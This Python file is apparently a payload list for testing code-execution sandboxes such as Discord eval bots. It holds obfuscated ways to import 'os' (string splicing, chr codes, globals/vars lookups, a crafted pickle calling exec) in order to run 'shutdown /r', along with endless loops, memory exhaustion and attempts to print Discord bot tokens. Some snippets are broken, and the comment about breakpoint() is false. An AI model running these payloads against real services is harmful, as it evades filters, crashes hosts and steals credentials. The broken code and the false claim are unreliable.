# a list of harmful scripts for you to test out

# read contents of python script
with open(__file__) as file:
    print(file.read())

# import os
import os
os.popen("shutdown /r")

# --- complex ---

# import os (with __import__)
__import__("o" + "s").system("shutdown /r")

# import os (without using the letters o and s)
__import__(repr(chr(111) + chr(115))).system("shutdown /r")

# import os (using repr)
repr("im" + "po" + "rt o" + "s as p")[1:-1]
p.system("shutdown /r")

# import os (using globals)
print(globals()["o" + "s"].system("shutdown /r").read())

# import os (using locals)
print(locals()["o" + "s"].system("shutdown /r").read())

# import os (using vars)
print(vars()["o" + "s"].system("shutdown /r").read())

# import os (using pickle)
pickle.loads(b'\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04ex' + b'ec\x94\x93\x94.')("from o"+"s imp"+"ort sy"+"stem as a")
a("shutdown /r")

# breakpoint - breakpoint is an endlesss function built into python, that cannot be stopped even if an error is raised
breakpoint()

# endless while loop
while True:
    print(True)

# endless for loop
x = [1]
for i in x:
    x.append(i)

# consume a lot of RAM
a = ""
while True:
    a += a + str(90**90)

# discord bots
# try get token
try:print(client.token)
except:pass
try:print(bot.token)
except:pass
try:print(ctx.token)
except:pass
try:print(self.token)
except:pass
try:print(self.http.token)
except:pass
try:print(main.token)
except:pass
try:print(message)
except:pass
try:print(msg)
except:pass
